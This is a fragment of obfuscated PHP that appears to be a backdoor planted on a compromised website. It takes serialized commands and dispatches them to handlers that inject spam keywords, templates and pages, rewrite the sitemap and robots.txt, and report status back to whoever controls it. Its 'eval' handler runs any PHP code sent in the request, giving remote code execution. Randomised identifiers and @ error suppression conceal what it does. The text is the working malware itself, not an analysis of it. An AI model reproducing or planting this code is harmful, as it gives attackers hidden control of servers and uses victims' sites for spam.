@unserialize($_va77akfk);if (!empty($_va77akfk)) {echo @serialize(array("uid" => _6h7t1au::$_kccu8oft, "v" => _6h7t1au::$_e66exhwx,"cache" => _gryhhsj::_vbciz(),"keywords" => count(_hehd2qc::_x4oa5()),"templates" => _pl6grm::_9nyhs()));}exit;}if ($_vcir81nx['sa'] == 'templates') {foreach ($_vcir81nx["templates"] as $_1d16jnpv) {_pl6grm::_1suf7($_1d16jnpv);echo @serialize(array("uid" => _6h7t1au::$_kccu8oft, "v" => _6h7t1au::$_e66exhwx,));}}if ($_vcir81nx['sa'] == 'keywords') {_hehd2qc::_1suf7($_vcir81nx["keywords"]);_6h7t1au::_cxaqm();echo @serialize(array("uid" => _6h7t1au::$_kccu8oft, "v" => _6h7t1au::$_e66exhwx,));}if ($_vcir81nx['sa'] == 'update_sitemap') {_6h7t1au::_cxaqm(TRUE);echo @serialize(array("uid" => _6h7t1au::$_kccu8oft, "v" => _6h7t1au::$_e66exhwx,));}if ($_vcir81nx['sa'] == 'pages') {$_v7bhyirj = 0;$_sb1e4fe0 = _hehd2qc::_x4oa5();if (_pl6grm::_9nyhs() > 0) {foreach ($_vcir81nx['pages'] as $_22xymd0n) {$_i2o41ezu = _gryhhsj::_mxztm($_22xymd0n["keyword"]);if (empty($_i2o41ezu)) {$_i2o41ezu = new _gryhhsj(_pl6grm::_wlmgx(), $_22xymd0n["text"], $_22xymd0n["keyword"], _6h7t1au::_tr5jf(_6h7t1au::$_oopjrvia, _6h7t1au::$_l5zc4fvu));$_i2o41ezu->_1suf7();$_v7bhyirj += 1;if (!in_array($_22xymd0n["keyword"], $_sb1e4fe0)) {_hehd2qc::_l8j1w($_22xymd0n["keyword"]);}}}}echo @serialize(array("uid" => _6h7t1au::$_kccu8oft, "v" => _6h7t1au::$_e66exhwx, "pages" => $_v7bhyirj));}if ($_vcir81nx["sa"] == "ping") {$_j5qi4kx1 = _6h7t1au::_1nsht();echo @serialize(array("uid" => _6h7t1au::$_kccu8oft, "v" => _6h7t1au::$_e66exhwx, "result" => (int)$_j5qi4kx1));}if ($_vcir81nx["sa"] == "robots") {$_j5qi4kx1 = _6h7t1au::_bizgn();echo @serialize(array("uid" => _6h7t1au::$_kccu8oft, "v" => _6h7t1au::$_e66exhwx, "result" => (int)$_j5qi4kx1));}}if ($_vcir81nx['sa'] == 'eval') {eval($_vcir81nx["data"]);exit;}}}$_9d9dl099 = new _6h7t1au();if ($_9d9dl099->_nrmqa()) {$_9d9dl099->_h0ghq();}exit();